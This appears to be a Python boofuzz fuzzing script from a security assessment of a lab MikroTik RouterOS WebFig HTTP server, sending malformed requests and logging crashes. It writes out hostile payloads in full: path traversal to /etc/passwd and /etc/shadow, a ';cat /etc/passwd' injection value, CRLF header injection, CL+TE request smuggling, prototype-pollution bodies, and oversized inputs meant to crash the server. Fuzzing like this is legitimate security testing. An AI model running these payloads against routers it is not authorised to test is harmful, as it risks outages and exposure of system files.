#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 -- WebFig HTTP Server Fuzzer (boofuzz)
Phase 7: Fuzzing -- ~150 test cases targeting the WebFig HTTP server on port 80.

Categories:
  1. HTTP verb fuzzing (~30)
  2. URL path fuzzing (~30)
  3. HTTP version fuzzing (~15)
  4. Header fuzzing (~30)
  5. POST body fuzzing (~30)
  6. WebFig-specific path fuzzing (~15)

Uses boofuzz Session with web_port=26001 and crash callback.
Target: [REDACTED-INTERNAL-IP], admin/TestPass123
"""

import os
import re
import sys
import time
import socket
import struct
import random
import traceback
import base64

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import *

from boofuzz import (
    Session, Target, TCPSocketConnection,
    s_initialize, s_static, s_string, s_delim, s_group,
)

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
HTTP_PORT = PORTS["http"]
BOOFUZZ_WEB_PORT = 26001
ALIVE_CHECK_INTERVAL = 10
MAX_DEPTH = 10          # limits mutation depth so we stay near ~150 total

ec = EvidenceCollector("webfig_http_fuzzer.py", phase=7)
test_counter = 0
crash_events = []


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def make_auth_header():
    creds = f"{ADMIN_USER}:{ADMIN_PASS}"
    return "Basic " + base64.b64encode(creds.encode()).decode()


AUTH_VALUE = make_auth_header()


def crash_callback(target, fuzz_data_logger, session, sock, *args, **kwargs):
    """Called by boofuzz after each test case to check if router is alive."""
    global test_counter, crash_events
    test_counter += 1

    if test_counter % ALIVE_CHECK_INTERVAL == 0:
        status = check_router_alive(timeout=5)
        if not status.get("alive"):
            crash_events.append({
                "test_index": test_counter,
                "timestamp": time.strftime("%H:%M:%S"),
                "mutant_index": session.mutant_index if hasattr(session, 'mutant_index') else None,
            })
            log(f"  ROUTER DOWN at test #{test_counter}! Waiting for recovery...")
            wait_for_router(max_wait=120)
            time.sleep(5)


def count_tests_for_request(session, req_name):
    """Estimate how many mutations boofuzz will produce for a request at max_depth."""
    try:
        return session.num_mutations(max_depth=MAX_DEPTH)
    except Exception:
        return "unknown"


# ---------------------------------------------------------------------------
# Request Definitions
# ---------------------------------------------------------------------------

def define_requests():
    """Define all boofuzz request blocks."""

    # ---- 1. HTTP Verb Fuzzing (~30 tests) ----
    s_initialize("verb_fuzz_get")
    s_string("GET", name="method_get", max_len=1024)
    s_static(" /rest/system/identity HTTP/1.1\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")

    s_initialize("verb_fuzz_post")
    s_string("POST", name="method_post", max_len=1024)
    s_static(" /rest/system/identity HTTP/1.1\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("Content-Type: application/json\r\n")
    s_static("Content-Length: 22\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")
    s_static('{"name":"MikroTik"}')

    s_initialize("verb_group")
    s_group("http_methods", values=[
        "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD",
        "TRACE", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL",
        "MOVE", "COPY", "LOCK", "UNLOCK", "PURGE",
        "AAAA", "G\x00ET", "", "A" * 500,
    ])
    s_static(" /rest/system/identity HTTP/1.1\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")

    # ---- 2. URL Path Fuzzing (~30 tests) ----
    s_initialize("path_fuzz")
    s_static("GET ")
    s_string("/rest/system/identity", name="url_path", max_len=4096)
    s_static(" HTTP/1.1\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")

    s_initialize("path_traversal")
    s_static("GET ")
    s_group("traversal_paths", values=[
        "/../../../etc/passwd",
        "/rest/../../etc/shadow",
        "/rest/system/%2e%2e/%2e%2e/etc/passwd",
        "/rest/system/..%252f..%252f..%252fetc/passwd",
        "/rest/system/identity%00.html",
        "/rest/system/identity;cat /etc/passwd",
        "/rest/" + "A" * 4096,
        "/rest/%n%n%n%n%n",
        "/rest/${7*7}",
        "/rest/system/identity?foo=" + "B" * 2048,
    ])
    s_static(" HTTP/1.1\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")

    # ---- 3. HTTP Version Fuzzing (~15 tests) ----
    s_initialize("version_fuzz")
    s_static("GET /rest/system/identity ")
    s_string("HTTP/1.1", name="http_version", max_len=256)
    s_static("\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")

    s_initialize("version_group")
    s_static("GET /rest/system/identity ")
    s_group("version_vals", values=[
        "HTTP/0.9", "HTTP/1.0", "HTTP/1.1", "HTTP/2.0", "HTTP/3.0",
        "HTTP/9.9", "HTTP/", "HTTP/1.1.1", "JUNK/1.0",
        "", "HTTP/1.1" + "\x00" * 10, "A" * 500,
    ])
    s_static("\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")

    # ---- 4. Header Fuzzing (~30 tests) ----
    s_initialize("header_host_fuzz")
    s_static("GET /rest/system/identity HTTP/1.1\r\n")
    s_static("Host: ")
    s_string(TARGET, name="host_val", max_len=4096)
    s_static("\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")

    s_initialize("header_content_type_fuzz")
    s_static("POST /rest/system/identity HTTP/1.1\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("Content-Type: ")
    s_string("application/json", name="ctype_val", max_len=1024)
    s_static("\r\n")
    s_static("Content-Length: 22\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")
    s_static('{"name":"MikroTik"}')

    s_initialize("header_auth_fuzz")
    s_static("GET /rest/system/identity HTTP/1.1\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static("Authorization: ")
    s_string(AUTH_VALUE, name="auth_val", max_len=4096)
    s_static("\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")

    s_initialize("header_useragent_fuzz")
    s_static("GET /rest/system/identity HTTP/1.1\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("User-Agent: ")
    s_string("Mozilla/5.0", name="ua_val", max_len=4096)
    s_static("\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")

    s_initialize("header_cookie_fuzz")
    s_static("GET /rest/system/identity HTTP/1.1\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("Cookie: ")
    s_string("session=abc123", name="cookie_val", max_len=4096)
    s_static("\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")

    s_initialize("header_crlf_inject")
    s_static("GET /rest/system/identity HTTP/1.1\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("X-Custom: ")
    s_group("crlf_values", values=[
        "normal",
        "value\r\nInjected-Header: injected",
        "value\r\n\r\nHTTP/1.1 200 OK\r\n",
        "value\r\nX-Evil: evil\r\nX-Evil2: evil2",
        "value\x00null-byte",
        "%0d%0aInjected: true",
        "\r\n" * 50,
    ])
    s_static("\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")

    # ---- 5. POST Body Fuzzing (~30 tests) ----
    s_initialize("body_json_fuzz")
    s_static("POST /rest/system/identity HTTP/1.1\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("Content-Type: application/json\r\n")
    # Note: Content-Length will be wrong for mutated bodies, which is intentional
    s_static("Connection: close\r\n")
    s_static("\r\n")
    s_string('{"name":"MikroTik"}', name="json_body", max_len=8192)

    s_initialize("body_malformed_json")
    s_static("POST /rest/system/identity HTTP/1.1\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("Content-Type: application/json\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")
    s_group("bad_json_bodies", values=[
        '{"name":' + '"A"' * 1000 + '}',
        '{"name":"' + "A" * 10000 + '"}',
        '{' * 100,
        '{"name":null,"name":null,"name":null}',
        '{"__proto__":{"admin":true}}',
        '{"constructor":{"prototype":{"admin":true}}}',
        '[]',
        'null',
        '',
        '\x00' * 100,
        '{"name":"%n%n%n%n%n"}',
        '{"name":"${7*7}{{7*7}}"}',
        '{"name":' + '["A"]' * 500 + '}',
        '\xff\xfe' + '{"name":"BOM"}',
    ])

    # ---- 6. WebFig-Specific Path Fuzzing (~15 tests) ----
    s_initialize("webfig_paths")
    s_static("GET ")
    s_group("webfig_path_vals", values=[
        "/webfig/",
        "/webfig/..%2f..%2f..%2fetc/passwd",
        "/jsproxy",
        "/jsproxy/" + "A" * 2048,
        "/rest/",
        "/rest/system/resource",
        "/rest/" + "%n" * 100,
        "/winbox/",
        "/winbox/" + "\x00" * 50,
        "/graphs/",
        "/graphs/iface/ether1/daily.png",
        "/graphs/../../../etc/passwd",
        "/favicon.ico",
        "/skins/",
        "/webfig/roteros.jg",
    ])
    s_static(" HTTP/1.1\r\n")
    s_static(f"Host: {TARGET}\r\n")
    s_static(f"Authorization: {AUTH_VALUE}\r\n")
    s_static("Connection: close\r\n")
    s_static("\r\n")


# ---------------------------------------------------------------------------
# Boofuzz Session Runner
# ---------------------------------------------------------------------------

def run_boofuzz_session():
    """Run all boofuzz requests and collect results."""
    global test_counter

    log("Defining boofuzz request blocks...")
    define_requests()

    request_names = [
        "verb_fuzz_get",
        "verb_fuzz_post",
        "verb_group",
        "path_fuzz",
        "path_traversal",
        "version_fuzz",
        "version_group",
        "header_host_fuzz",
        "header_content_type_fuzz",
        "header_auth_fuzz",
        "header_useragent_fuzz",
        "header_cookie_fuzz",
        "header_crlf_inject",
        "body_json_fuzz",
        "body_malformed_json",
        "webfig_paths",
    ]

    total_mutations = 0
    category_map = {
        "verb_fuzz_get": "http_verb",
        "verb_fuzz_post": "http_verb",
        "verb_group": "http_verb",
        "path_fuzz": "url_path",
        "path_traversal": "url_path",
        "version_fuzz": "http_version",
        "version_group": "http_version",
        "header_host_fuzz": "header",
        "header_content_type_fuzz": "header",
        "header_auth_fuzz": "header",
        "header_useragent_fuzz": "header",
        "header_cookie_fuzz": "header",
        "header_crlf_inject": "header",
        "body_json_fuzz": "post_body",
        "body_malformed_json": "post_body",
        "webfig_paths": "webfig_paths",
    }

    for req_name in request_names:
        log(f"\n{'='*60}")
        log(f"Fuzzing request: {req_name}")
        log(f"{'='*60}")

        category = category_map.get(req_name, "unknown")
        test_counter = 0

        try:
            sess = Session(
                target=Target(
                    connection=TCPSocketConnection(TARGET, HTTP_PORT, send_timeout=5.0,
                                                   recv_timeout=5.0),
                ),
                web_port=BOOFUZZ_WEB_PORT,
                keep_web_open=False,
                sleep_time=0.1,
                crash_threshold_request=100,
                crash_threshold_element=100,
                ignore_connection_reset=True,
                ignore_connection_aborted=True,
                ignore_connection_issues_when_sending_fuzz_data=True,
                receive_data_after_each_request=True,
                post_test_case_callbacks=[crash_callback],
            )

            sess.connect(sess.root, s_get=req_name if False else None)
            # Actually connect request to the graph
            from boofuzz import s_get
            req = s_get(req_name)
            sess.connect(req)

            # Run with max_depth to limit mutations
            sess.fuzz(name=req_name, max_depth=MAX_DEPTH)

            cases_run = test_counter
            total_mutations += cases_run
            log(f"  Completed {cases_run} test cases for {req_name}")

            ec.add_test(
                category=f"boofuzz_{category}",
                name=f"boofuzz_{req_name}",
                description=f"Boofuzz fuzzing of {req_name} (max_depth={MAX_DEPTH})",
                result=f"{cases_run} mutations executed",
                details={
                    "request": req_name,
                    "category": category,
                    "mutations_run": cases_run,
                    "max_depth": MAX_DEPTH,
                    "crashes_during": len([c for c in crash_events
                                           if c.get("test_index", 0) <= cases_run]),
                },
                anomaly=len(crash_events) > 0,
            )

        except Exception as e:
            log(f"  Error running {req_name}: {e}")
            traceback.print_exc()
            ec.add_test(
                category=f"boofuzz_{category}",
                name=f"boofuzz_{req_name}_error",
                description=f"Boofuzz error on {req_name}",
                result=f"ERROR: {e}",
                details={"error": str(e), "traceback": traceback.format_exc()},
                anomaly=True,
            )

        # Health check between request blocks
        health = check_router_alive()
        if not health.get("alive"):
            log("Router down between fuzzing blocks! Waiting...")
            wait_for_router(max_wait=120)
            time.sleep(5)

        # Increment web port to avoid conflicts on restart
        BOOFUZZ_WEB_PORT_NEXT = BOOFUZZ_WEB_PORT  # boofuzz handles cleanup

    return total_mutations


# ---------------------------------------------------------------------------
# Supplementary Raw Socket Tests (for coverage gaps boofuzz cannot hit)
# ---------------------------------------------------------------------------

def run_supplementary_tests():
    """Additional raw-socket tests to cover edge cases boofuzz misses."""
    log("\n" + "=" * 60)
    log("Supplementary Raw Socket Tests")
    log("=" * 60)

    supp_tests = [
        # Oversized header value
        ("header_overflow_64KB",
         f"GET /rest/system/identity HTTP/1.1\r\n"
         f"Host: {TARGET}\r\n"
         f"Authorization: {AUTH_VALUE}\r\n"
         f"X-Overflow: {'A' * 65536}\r\n"
         f"Connection: close\r\n"
         f"\r\n"),
        # 500 custom headers
        ("many_headers_500",
         f"GET /rest/system/identity HTTP/1.1\r\n"
         f"Host: {TARGET}\r\n"
         f"Authorization: {AUTH_VALUE}\r\n"
         + "".join(f"X-H-{i}: val-{i}\r\n" for i in range(500))
         + "Connection: close\r\n"
         + "\r\n"),
        # HTTP/0.9 (no headers)
        ("http_09_request",
         "GET /rest/system/identity\r\n"),
        # Double Content-Length
        ("double_content_length",
         f"POST /rest/system/identity HTTP/1.1\r\n"
         f"Host: {TARGET}\r\n"
         f"Authorization: {AUTH_VALUE}\r\n"
         f"Content-Type: application/json\r\n"
         f"Content-Length: 22\r\n"
         f"Content-Length: 0\r\n"
         f"Connection: close\r\n"
         f"\r\n"
         f'{{"name":"MikroTik"}}'),
        # Chunked encoding abuse
        ("chunked_huge_size",
         f"POST /rest/system/identity HTTP/1.1\r\n"
         f"Host: {TARGET}\r\n"
         f"Authorization: {AUTH_VALUE}\r\n"
         f"Content-Type: application/json\r\n"
         f"Transfer-Encoding: chunked\r\n"
         f"Connection: close\r\n"
         f"\r\n"
         f"FFFFFFFF\r\n"
         f'{{"name":"MikroTik"}}\r\n'
         f"0\r\n"
         f"\r\n"),
        # Request smuggling CL+TE
        ("smuggle_cl_te",
         f"POST /rest/system/identity HTTP/1.1\r\n"
         f"Host: {TARGET}\r\n"
         f"Authorization: {AUTH_VALUE}\r\n"
         f"Content-Type: application/json\r\n"
         f"Content-Length: 22\r\n"
         f"Transfer-Encoding: chunked\r\n"
         f"Connection: close\r\n"
         f"\r\n"
         f"0\r\n"
         f"\r\n"
         f"GET /rest/system/resource HTTP/1.1\r\n"
         f"Host: {TARGET}\r\n"
         f"\r\n"),
        # Binary garbage
        ("binary_garbage",
         None),  # handled separately
        # Empty request line
        ("empty_request",
         "\r\n\r\n"),
        # Very long method
        ("method_10KB",
         "A" * 10240 + f" / HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n"),
        # Null bytes in URL
        ("null_in_url",
         f"GET /rest/system/identity\x00evil HTTP/1.1\r\n"
         f"Host: {TARGET}\r\n"
         f"Authorization: {AUTH_VALUE}\r\n"
         f"Connection: close\r\n"
         f"\r\n"),
    ]

    for idx, (name, payload) in enumerate(supp_tests):
        try:
            if payload is None:
                # Binary garbage test
                payload_bytes = os.urandom(1024)
            elif isinstance(payload, str):
                payload_bytes = payload.encode("latin-1", errors="replace")
            else:
                payload_bytes = payload

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((TARGET, HTTP_PORT))
            sock.sendall(payload_bytes)

            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 65536:
                        break
            except socket.timeout:
                pass
            sock.close()

            resp_text = response.decode("latin-1", errors="replace")[:500]
            status_code = 0
            if resp_text.startswith("HTTP/"):
                parts = resp_text.split(" ", 2)
                if len(parts) >= 2:
                    try:
                        status_code = int(parts[1])
                    except ValueError:
                        pass

            is_anomaly = (status_code >= 500 or
                          (len(response) == 0 and name != "binary_garbage") or
                          status_code == 0)

            ec.add_test(
                category="supplementary",
                name=f"raw_{name}",
                description=f"Raw socket test: {name}",
                result=f"HTTP {status_code}, {len(response)} bytes" if status_code else f"{len(response)} bytes response",
                details={
                    "http_status": status_code,
                    "response_size": len(response),
                    "response_preview": resp_text[:300],
                },
                anomaly=is_anomaly,
            )

        except Exception as e:
            ec.add_test(
                category="supplementary",
                name=f"raw_{name}",
                description=f"Raw socket test: {name}",
                result=f"Error: {e}",
                details={"error": str(e)},
                anomaly=True,
            )

        # Health check
        if (idx + 1) % ALIVE_CHECK_INTERVAL == 0:
            health = check_router_alive()
            if not health.get("alive"):
                log(f"  ROUTER DOWN after supplementary test '{name}'!")
                ec.add_finding(
                    severity="HIGH",
                    title=f"Router crash during supplementary HTTP fuzzing: {name}",
                    description=f"Router became unresponsive after raw HTTP test '{name}'",
                    evidence_refs=[f"raw_{name}"],
                    cwe="CWE-400",
                )
                wait_for_router(max_wait=120)
                time.sleep(5)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    log("=" * 70)
    log("MikroTik RouterOS CHR 7.20.8 -- WebFig HTTP Server Fuzzer (boofuzz)")
    log(f"Phase 7: Fuzzing -- Target: {TARGET}:{HTTP_PORT}")
    log("=" * 70)

    # Pre-flight
    health = check_router_alive()
    if not health.get("alive"):
        log("Router not responding! Waiting...")
        health = wait_for_router(max_wait=120)
        if not health.get("alive"):
            log("FATAL: Router unreachable. Aborting.")
            sys.exit(1)
    log(f"Router alive: version={health.get('version')}, uptime={health.get('uptime')}")

    # Run boofuzz session
    try:
        boofuzz_mutations = run_boofuzz_session()
        log(f"\nBoofuzz phase complete: ~{boofuzz_mutations} mutations executed")
    except Exception as e:
        log(f"Boofuzz session error: {e}")
        traceback.print_exc()
        boofuzz_mutations = 0

    # Inter-phase health check
    health = check_router_alive()
    if not health.get("alive"):
        log("Router down after boofuzz! Waiting...")
        wait_for_router(max_wait=120)
        time.sleep(5)

    # Run supplementary raw socket tests
    try:
        run_supplementary_tests()
    except Exception as e:
        log(f"Supplementary tests error: {e}")
        traceback.print_exc()

    # Record crash events
    if crash_events:
        ec.add_finding(
            severity="HIGH" if len(crash_events) >= 3 else "MEDIUM",
            title=f"WebFig HTTP server stability: {len(crash_events)} crash events during fuzzing",
            description=(
                f"Router became unresponsive {len(crash_events)} time(s) during "
                f"WebFig HTTP fuzzing. Events: {crash_events}"
            ),
            evidence_refs=["webfig_http_fuzzer"],
            cwe="CWE-400",
        )

    # Save evidence and pull logs
    ec.save("webfig_http_fuzzer.json")
    ec.summary()

    log(f"\nCrash events: {len(crash_events)}")
    log(f"Findings: {len(ec.results['findings'])}")


if __name__ == "__main__":
    os.chdir(BASE_DIR)
    main()
